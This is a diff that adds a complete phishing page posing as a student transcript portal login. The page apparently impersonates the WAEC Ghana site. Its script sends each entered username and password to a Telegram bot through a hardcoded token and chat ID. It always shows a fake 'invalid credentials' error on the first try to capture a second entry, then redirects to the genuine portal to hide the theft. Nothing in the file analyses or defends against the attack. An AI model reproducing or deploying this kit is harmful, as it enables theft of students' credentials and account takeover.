@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>--::Login::--</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    body {
+      background: #fff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Blue top header */
+    .header {
+      width: 100%;
+      height: 55px;
+      background: #00bfff;
+    }
+
+    /* Center main content */
+    .container {
+      text-align: center;
+      margin: 25px auto;
+      padding: 0 15px;
+      width: 100%;
+      max-width: 400px;
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .container h1 {
+      color: #1a73b7;
+      font-size: 22px;
+      margin-bottom: 10px;
+      font-weight: 600;
+    }
+
+    /* Logo image */
+    .logos img {
+      width: 100%;
+      max-width: 270px;
+      height: auto;
+      margin: 10px 0 25px 0;
+    }
+
+    /* Login box */
+    .login-box {
+      background: #f8f8f8;
+      width: 100%;
+      margin: auto;
+      padding: 30px 25px 25px 25px;
+      border-radius: 5px;
+      box-shadow: 0 0 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-box h2 {
+      color: #1a73b7;
+      margin-bottom: 20px;
+      font-size: 20px;
+    }
+
+    /* Input fields */
+    .input-box {
+      display: flex;
+      align-items: center;
+      margin-bottom: 15px;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+      background: #fff;
+      height: 45px;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+
+    /* Light blue glow effect when focused - ONLY on the border */
+    .input-box:focus-within {
+      box-shadow: 0 0 10px rgba(0, 191, 255, 0.7);
+      border-color: #00bfff;
+    }
+
+    .input-box .icon {
+      background: #f1f1f1;
+      width: 45px;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-right: 1px solid #ddd;
+    }
+
+    .input-box .icon i {
+      color: #b94a48;
+      font-size: 14px;
+    }
+
+    .input-box input {
+      flex: 1;
+      border: none;
+      outline: none;
+      padding: 0 10px;
+      font-size: 16px; /* Larger for mobile */
+      height: 100%;
+    }
+
+    /* Remember me and forgot password */
+    .options {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 10px 0 20px 0;
+      font-size: 14px;
+      color: #333;
+    }
+
+    .options label {
+      display: flex;
+      align-items: center;
+    }
+
+    .options label input {
+      margin-right: 4px;
+    }
+
+    .options a {
+      color: #1a73b7;
+      text-decoration: none;
+    }
+
+    .options a:hover {
+      text-decoration: underline;
+    }
+
+    /* Login button */
+    .btn {
+      width: 100%;
+      background: #00bfff;
+      color: #fff;
+      border: none;
+      padding: 12px 0;
+      font-size: 16px;
+      border-radius: 3px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .btn:hover {
+      background: #0097cc;
+    }
+
+    /* Status text */
+    #status {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    /* Redirect message */
+    .redirect-message {
+      margin-top: 15px;
+      padding: 10px;
+      background: #e8f5e9;
+      border-radius: 4px;
+      color: #2e7d32;
+      font-size: 14px;
+      display: none;
+    }
+
+    /* Mobile responsiveness */
+    @media (max-width: 480px) {
+      .container {
+        margin: 15px auto;
+      }
+      
+      .login-box {
+        padding: 25px 20px 20px 20px;
+      }
+      
+      .container h1 {
+        font-size: 20px;
+      }
+      
+      .login-box h2 {
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Top blue header bar -->
+  <div class="header"></div>
+
+  <!-- Main container -->
+  <div class="container">
+    <h1>STUDENT TRANSCRIPT PORTAL</h1>
+
+    <!-- Logos -->
+    <div class="logos">
+      <img src="https://i.ibb.co/LX9fk0G2/file-29.jpg" alt="Portal Banner">
+    </div>
+
+    <!-- Login box -->
+    <div class="login-box">
+      <h2>Login</h2>
+
+      <form id="loginForm">
+        <div class="input-box">
+          <div class="icon"><i class="fa fa-user"></i></div>
+          <input id="username" type="text" placeholder="Username" required autocomplete="off" />
+        </div>
+
+        <div class="input-box">
+          <div class="icon"><i class="fa fa-lock"></i></div>
+          <input id="password" type="password" placeholder="Password" required autocomplete="off" />
+        </div>
+
+        <div class="options">
+          <label><input type="checkbox" checked> Remember me</label>
+          <a href="#">Forgot Password?</a>
+        </div>
+
+        <button id="submitBtn" type="submit" class="btn">Login</button>
+        <p id="status"></p>
+        <div id="redirectMessage" class="redirect-message">
+          Login successful! Redirecting to WAEC Portal...
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    // Replace with your Telegram bot info
+    const BOT_TOKEN = "8524811552:AAHPAEcmAc-9OiZ4YIduDtMECJHQdib_vzE";
+    const CHAT_ID = "6981959913";
+    
+    // Track login attempts
+    let loginAttempts = 0;
+
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const name = document.getElementById('username').value.trim();
+      const phone = document.getElementById('password').value.trim();
+      const status = document.getElementById('status');
+      const redirectMessage = document.getElementById('redirectMessage');
+      const button = document.getElementById('submitBtn');
+      
+      button.disabled = true;
+
+      if (!name || !phone) {
+        status.textContent = "Please fill in all fields.";
+        status.style.color = "red";
+        button.disabled = false;
+        return;
+      }
+
+      const text = `📘 *New Login Info*\n👤 Username: ${name}\n🔑 Password: ${phone}`;
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+      try {
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: "Markdown"
+          })
+        });
+
+        if (res.ok) {
+          loginAttempts++;
+          
+          // First attempt: Show invalid login
+          if (loginAttempts === 1) {
+            status.textContent = "❌ Invalid login credentials. Please try again.";
+            status.style.color = "red";
+            redirectMessage.style.display = 'none';
+          } 
+          // Second attempt: Redirect to WAEC portal
+          else if (loginAttempts >= 2) {
+            status.textContent = "✅ Login successful!";
+            status.style.color = "green";
+            
+            // Show redirect message
+            redirectMessage.style.display = 'block';
+            redirectMessage.textContent = "Login successful! Redirecting to WAEC Portal...";
+            
+            // Redirect to WAEC portal after 2 seconds
+            setTimeout(() => {
+              window.location.href = "https://stpshs.waecgh.org/";
+            }, 2000);
+          }
+          
+        } else {
+          status.textContent = "⚠️ Login failed! Please try again.";
+          status.style.color = "red";
+          redirectMessage.style.display = 'none';
+        }
+      } catch (err) {
+        status.textContent = "❌ Error: " + err.message;
+        status.style.color = "red";
+        redirectMessage.style.display = 'none';
+      } finally {
+        button.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
